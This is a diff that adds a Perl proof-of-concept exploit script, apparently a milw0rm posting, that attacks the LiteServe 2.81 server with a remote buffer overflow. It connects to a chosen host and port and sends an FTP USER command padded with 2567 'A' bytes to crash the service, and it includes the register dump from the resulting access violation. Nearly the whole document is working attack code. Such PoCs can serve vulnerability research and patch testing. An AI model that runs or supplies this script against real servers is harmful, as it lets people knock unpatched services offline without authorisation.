@@ -1,0 +1,45 @@
+#!/bin/perl
+
+# LiteServe 2.81 Remote buffer overflow Poc (user)
+# download : http://www.cmfperception.com/liteserve/pls2_81.exe
+
+# -------------------------------------
+# EAX 00000001
+# ECX 7FFDF000
+# EDX 41414155
+# EBX 010ED8EC ASCII "AAAAAAAAAAAA"
+# ESP 0012E414
+# EBP 0012E45C
+# ESI 41414141
+# EDI 41414155
+# EIP 7C911010 ntdll.7C911010
+
+# Access violation When Reading [41414169]
+# --------------------------------------
+
+use IO::Socket;
+print "[+] Author : HouSSaMix \n";
+print "[+] LiteServe 2.81 Remote buffer overflow Poc \n";
+
+if (@ARGV < 2)
+{
+ print "[*] Usage: hsmx.pl host port\n";
+ print "[*] Exemple: hsmx.pl 127.0.0.1 21\n";
+ exit;
+}
+
+$ip = $ARGV[0];
+$port = $ARGV[1];
+
+$cc = "\x41" x 2567  ;
+
+$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "\n[-] Connecting: Failed!\n";
+print "\n[+] Connecting: Ok!\n";
+print "[+] Sending bad request...\n";
+print $socket "USER $cc\n";
+sleep(5);
+close($socket);
+
+print "[+] bad request sent \n";
+
+# milw0rm.com [2009-01-07]
